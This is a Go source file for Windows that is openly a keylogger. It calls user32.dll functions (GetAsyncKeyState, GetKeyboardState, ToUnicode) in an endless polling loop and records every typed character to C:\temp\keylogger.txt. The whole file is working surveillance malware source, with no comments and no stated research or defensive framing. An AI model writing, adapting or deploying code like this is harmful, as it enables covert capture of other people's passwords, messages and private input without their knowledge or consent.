package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	user32                = syscall.NewLazyDLL("user32.dll")
	geyasynckeystate  = user32.NewProc("GetAsyncKeyState")
	geykboardstate  = user32.NewProc("GetKeyboardState")
	mapvkkey     = user32.NewProc("MapVirtualKeyW")
	sigmaunicode        = user32.NewProc("ToUnicode")
)

const (
	mapVK = 2
)

func GetAsyncKeyState(vKey int) bool {
	ret, _, _ := geyasynckeystate.Call(uintptr(vKey))
	return ret == 0x8001 || ret == 0x8000
}

func GetKeyboardState(lpKeyState *[256]byte) bool {
	ret, _, _ := geykboardstate.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return ret != 0
}

func MapVirtualKey(uCode uint, uMapType uint) uint {
	ret, _, _ := mapvkkey.Call(uintptr(uCode), uintptr(uMapType))
	return uint(ret)
}

func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
	ret, _, _ := sigmaunicode.Call(uintptr(wVirtKey),uintptr(wScanCode),uintptr(unsafe.Pointer(lpKeyState)),uintptr(unsafe.Pointer(pwszBuff)),uintptr(cchBuff),uintptr(wFlags),)
	return int(ret)
}

func main() {
	const log = "C:\\temp\\keylogger.txt"
	if _, err := os.Stat(log); os.IsNotExist(err) {
		file, err := os.Create(log)
		if err != nil {
			fmt.Println("err :sigma error - creating file", err)
			return
		}
		file.Close()
	}
	file, err := os.OpenFile(log, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		fmt.Println("err: sigma error - open file:", err)
		return
	}
	defer file.Close()

	for {
		for ascii := 9; ascii <= 254; ascii++ {
			if GetAsyncKeyState(ascii) {
				var keyState [256]byte
				if !GetKeyboardState(&keyState) {
					continue
				}

				virtualKey := MapVirtualKey(uint(ascii), mapVK)

				var buffer [2]uint16
				ret := ToUnicode(uint(ascii), uint(virtualKey), &keyState, &buffer[0], int(unsafe.Sizeof(buffer)), 0)

				if ret > 0 {
					runes := utf16.Decode(buffer[:ret])
					text := string(runes)
					file.WriteString(text)
				}

				time.Sleep(40 * time.Millisecond)
			}
		}
		time.Sleep(40 * time.Millisecond)
	}
}
